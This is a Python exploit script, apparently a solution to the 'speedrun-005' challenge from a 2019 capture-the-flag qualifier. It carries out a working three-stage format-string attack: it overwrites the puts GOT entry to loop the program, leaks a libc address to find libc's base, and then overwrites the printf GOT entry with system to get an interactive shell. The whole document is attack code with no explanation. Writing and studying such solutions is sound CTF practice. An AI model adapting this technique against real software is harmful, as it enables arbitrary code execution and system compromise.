import threading
from ptrlib import *
from time import sleep

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./speedrun-005")

#sock = Socket("speedrun-005.quals2019.oooverflow.io", 31337)
sock = Process("./speedrun-005")

got_puts = 0x000000601018
got_printf = 0x000000601028
addr_start = 0x40069d
one_gadget = 0x4f2c5 + 0x8d3000

# Stage 1
payload = ""
n = 0
for i in range(8):
    l = ((((addr_start >> (i * 8)) & 0xff) - n - 1) & 0xff) + 1
    payload += "%{}c%{}$hhn".format(l, 6 + 12 + i)
    n += l
payload += "A" * (8 - (len(payload) % 8))
payload = str2bytes(payload)
for i in range(8):
    payload += p64(got_puts + i)
sock.recvuntil("time?")
sock.sendline(payload)

# Stage 2
sock.recvuntil("time?")
payload = "%{}$p".format(0x400 // 8 + 145)
sock.sendline(payload)
sock.recvuntil("Interesting ")
libc_base = int(sock.recvline(), 16) - libc.symbol("__libc_start_main") - 0xe7
dump("libc base = " + hex(libc_base))

# Stage 3
payload = ""
n = 0
addr_system = libc_base + libc.symbol("system")
for i in range(8):
    l = ((((addr_system >> (i * 8)) & 0xff) - n - 1) & 0xff) + 1
    payload += "%{}c%{}$hhn".format(l, 6 + 12 + i)
    n += l
payload += "A" * (8 - (len(payload) % 8))
payload = str2bytes(payload)
for i in range(8):
    payload += p64(got_printf + i)
print(payload)
sock.recvuntil("time?")
sock.sendline(payload)

# get the shell!

sock.interactive()
